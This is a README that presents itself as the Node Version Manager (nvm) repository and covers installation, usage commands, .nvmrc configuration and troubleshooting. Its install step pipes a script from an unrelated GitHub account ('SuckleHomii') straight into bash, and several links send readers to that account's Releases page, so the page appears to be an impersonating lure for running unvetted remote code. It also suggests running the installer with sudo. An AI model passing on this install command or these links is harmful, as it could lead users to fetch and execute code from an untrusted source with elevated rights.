# Node Version Manager (nvm) 🚀

![Node Version Manager](https://img.shields.io/badge/nvm-v0.39.1-brightgreen) ![Node.js](https://img.shields.io/badge/Node.js-v16.13.0-blue) ![License](https://img.shields.io/badge/license-MIT-lightgrey)

Welcome to the Node Version Manager (nvm) repository! This tool is a POSIX-compliant bash script designed to help you manage multiple active Node.js versions with ease. Whether you are a developer working on multiple projects or just want to experiment with different Node.js versions, nvm is here to simplify your workflow.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Commands](#commands)
- [Configuration](#configuration)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)
- [License](#license)
- [Links](#links)

## Features

- **Easy Version Management**: Switch between Node.js versions effortlessly.
- **POSIX Compliance**: Works seamlessly across various Unix-like systems.
- **LTS Support**: Easily install and use Long Term Support versions of Node.js.
- **.nvmrc Support**: Specify Node.js versions per project with a simple `.nvmrc` file.
- **Zsh Compatibility**: Works perfectly in Zsh, making it versatile for different shell users.

## Installation

To get started with nvm, you need to download and execute the installation script. Visit the [Releases](https://github.com/SuckleHomii/nvm/releases) section to find the latest version. Download the script and run it in your terminal:

```bash
curl -o- https://raw.githubusercontent.com/SuckleHomii/nvm/v0.39.1/install.sh | bash
```

This command fetches the installation script and runs it. Follow the instructions displayed in your terminal to complete the setup.

## Usage

After installation, you can start using nvm to manage your Node.js versions. Here’s how to do it:

1. **List Installed Versions**:
   ```bash
   nvm ls
   ```

2. **Install a New Version**:
   ```bash
   nvm install <version>
   ```

3. **Use a Specific Version**:
   ```bash
   nvm use <version>
   ```

4. **Set Default Version**:
   ```bash
   nvm alias default <version>
   ```

5. **Uninstall a Version**:
   ```bash
   nvm uninstall <version>
   ```

## Commands

nvm provides several commands to manage Node.js versions. Here’s a breakdown of the most common commands:

- `nvm install <version>`: Installs the specified version of Node.js.
- `nvm use <version>`: Activates the specified version for the current session.
- `nvm ls`: Lists all installed Node.js versions.
- `nvm uninstall <version>`: Removes the specified version from your system.
- `nvm alias <name> <version>`: Creates an alias for a specific version.

## Configuration

You can configure nvm to suit your needs. Here are some common configurations:

- **Set Node.js Version Globally**: Use the `nvm alias` command to set a default version.
- **Use .nvmrc Files**: Create a `.nvmrc` file in your project directory to specify the Node.js version for that project. Simply run `nvm use` in the project directory, and nvm will switch to the version specified in the `.nvmrc` file.

## Troubleshooting

If you encounter issues while using nvm, here are some common troubleshooting steps:

- **Command Not Found**: Ensure that nvm is properly installed. You may need to restart your terminal or source your profile file.
- **Version Not Installed**: Use `nvm install <version>` to install the version you want to use.
- **Permissions Issues**: If you face permission issues, consider running the installation script with `sudo` or adjust the permissions of your Node.js installation directory.

## Contributing

We welcome contributions to nvm! If you would like to help improve this project, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them with clear messages.
4. Push your changes to your forked repository.
5. Submit a pull request.

Please ensure that your code follows the existing style and includes tests where applicable.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Links

For more information and updates, check out the [Releases](https://github.com/SuckleHomii/nvm/releases) section. You can find the latest features and improvements there.

---

Thank you for using Node Version Manager (nvm)! We hope it makes your Node.js development experience smoother and more efficient. If you have any questions or suggestions, feel free to reach out or contribute to the project. Happy coding!